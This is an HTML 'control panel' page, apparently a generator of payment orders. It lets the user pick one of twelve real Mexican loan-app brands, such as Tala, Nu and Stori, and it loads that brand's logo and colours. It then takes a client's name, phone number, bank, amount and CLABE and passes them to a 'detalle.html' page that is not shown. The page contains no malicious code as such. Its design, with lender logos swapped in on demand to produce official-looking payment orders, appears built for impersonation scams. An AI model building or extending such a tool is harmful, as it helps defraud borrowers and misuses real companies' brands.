<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Control - Generador</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #0f172a; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card-panel { width: 100%; max-width: 420px; background: white; border-radius: 2.5rem; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
        input, select { width: 100%; padding: 0.85rem; border: 2px solid #f1f5f9; border-radius: 1rem; font-weight: 700; color: #1e293b; outline: none; transition: all 0.2s; }
        input:focus, select:focus { border-color: #3b82f6; background: #f8fafc; }
        label { display: block; text-align: center; font-size: 0.65rem; font-weight: 900; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 0.4rem; }
    </style>
</head>
<body>

<div class="card-panel">
    <div id="header-preview" class="p-8 text-center transition-colors duration-500" style="background-color: #06b6d4;">
        <div class="w-24 h-24 bg-white rounded-3xl mx-auto mb-4 flex items-center justify-center overflow-hidden shadow-xl border-4 border-white/20">
            <img id="logo-preview" src="https://tala.co/wp-content/uploads/2021/10/Social-Media-Image.png" class="w-full h-full object-cover">
        </div>
        
        <select id="v" onchange="cambiarApp()">
            <option value="prestamos">Préstamos</option>
            <option value="dinero">Préstamos de Dinero</option>
            <option value="nu">Préstamos NU</option>
            <option value="talacred" selected>Tala Crédito</option>
            <option value="dida">DidaPréstamos</option>
            <option value="rapidos">Préstamos Rápidos</option>
            <option value="worldmox">Worldmoxpro cash</option>
            <option value="movil">Movil Cash</option>
            <option value="cashcredit">Cash Credit</option>
            <option value="stori">Stori Crédito</option>
            <option value="facil">Fácil Préstamo</option>
            <option value="tala">Tala Préstamos</option>
        </select>
    </div>

    <div class="p-7 space-y-5">
        <div class="grid grid-cols-2 gap-4">
            <div>
                <label>Monto ($)</label>
                <input type="number" id="m" placeholder="2000">
            </div>
            <div>
                <label>Banco</label>
                <select id="b">
                    <option value="BBVA">BBVA</option>
                    <option value="MERCADO PAGO">MERCADO PAGO</option>
                    <option value="BANAMEX">BANAMEX</option>
                    <option value="SANTANDER">SANTANDER</option>
                </select>
            </div>
        </div>

        <div>
            <label>Nombre del Cliente</label>
            <input type="text" id="n" placeholder="Nombre Completo" style="text-transform: uppercase;">
        </div>

        <div>
            <label>Teléfono</label>
            <input type="text" id="t" placeholder="10 Dígitos">
        </div>

        <div>
            <label>CLABE / Liga de Pago</label>
            <input type="text" id="c" placeholder="Número de cuenta o CLABE">
        </div>

        <button onclick="enviar()" class="w-full bg-slate-900 hover:bg-black text-white font-black py-4 rounded-2xl transition-all uppercase tracking-widest shadow-lg active:scale-95">
            Generar Orden de Pago
        </button>
    </div>
</div>

<script>
    const configApps = {
        'prestamos': { c: '#a3e635', i: 'https://play-lh.googleusercontent.com/OhU802wo_ffOcR5f6MAvz5ebNFvXOLDiC2p_b7kGS7_XBwFz3HI9jtNn6C8fBiQrzjUx' },
        'dinero': { c: '#1e40af', i: 'https://play-lh.googleusercontent.com/kw_CZs5smCFpyFtI9pWkKhY1eRfX6E15tdTEU_KpxTaUYzUtRFx9b8eOJYpn-Ze4BQ=w480-h960-rw' },
        'nu': { c: '#820ad1', i: 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png' },
        'talacred': { c: '#06b6d4', i: 'https://tala.co/wp-content/uploads/2021/10/Social-Media-Image.png' },
        'dida': { c: '#0057ff', i: 'https://play-lh.googleusercontent.com/oXTAgpljdbV5LuAOt1NP9_JafUZe9BNl7pwQ01ndl4blYL4N4IQh4-n456P5l_hc1A=s96-rw' },
        'rapidos': { c: '#10b981', i: 'https://play-lh.googleusercontent.com/4cDOjhOrs563pTALZF8fikxthh5xznVnrFXReAOmWoNkfI0jncuig3l5hzOiNABAaw=w480-h960-rw' },
        'worldmox': { c: '#1e293b', i: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTOQ9FrkHlgWkaMJt_Za2IN0R5Z0UamJ_VQKg&s' },
        'movil': { c: '#22c55e', i: 'https://play-lh.googleusercontent.com/OhU802wo_ffOcR5f6MAvz5ebNFvXOLDiC2p_b7kGS7_XBwFz3HI9jtNn6C8fBiQrzjUx' },
        'cashcredit': { c: '#f59e0b', i: 'https://play-lh.googleusercontent.com/kw_CZs5smCFpyFtI9pWkKhY1eRfX6E15tdTEU_KpxTaUYzUtRFx9b8eOJYpn-Ze4BQ=w480-h960-rw' },
        'stori': { c: '#7c3aed', i: 'https://play-lh.googleusercontent.com/oXTAgpljdbV5LuAOt1NP9_JafUZe9BNl7pwQ01ndl4blYL4N4IQh4-n456P5l_hc1A=s96-rw' },
        'facil': { c: '#0ea5e9', i: 'https://play-lh.googleusercontent.com/4cDOjhOrs563pTALZF8fikxthh5xznVnrFXReAOmWoNkfI0jncuig3l5hzOiNABAaw=w480-h960-rw' },
        'tala': { c: '#fb923c', i: 'https://play-lh.googleusercontent.com/LVhWYJjxouE6-Exr-6kmktigDIOeGPEq4JHSGfkaEKhkmBwaXYkWS0Pv6SDIr5REsvHu=w480-h960-rw' }
    };

    function cambiarApp() {
        const seleccion = document.getElementById('v').value;
        const app = configApps[seleccion];
        document.getElementById('header-preview').style.backgroundColor = app.c;
        document.getElementById('logo-preview').src = app.i;
    }

    function enviar() {
        const v = document.getElementById('v').value;
        const m = document.getElementById('m').value;
        const b = document.getElementById('b').value;
        const n = document.getElementById('n').value;
        const t = document.getElementById('t').value;
        const c = document.getElementById('c').value;

        // Construir URL con parámetros
        const url = `detalle.html?v=${v}&m=${m}&b=${b}&n=${encodeURIComponent(n)}&t=${t}&c=${c}`;
        window.location.href = url;
    }

    // Iniciar con la app seleccionada
    cambiarApp();
</script>

</body>
</html>
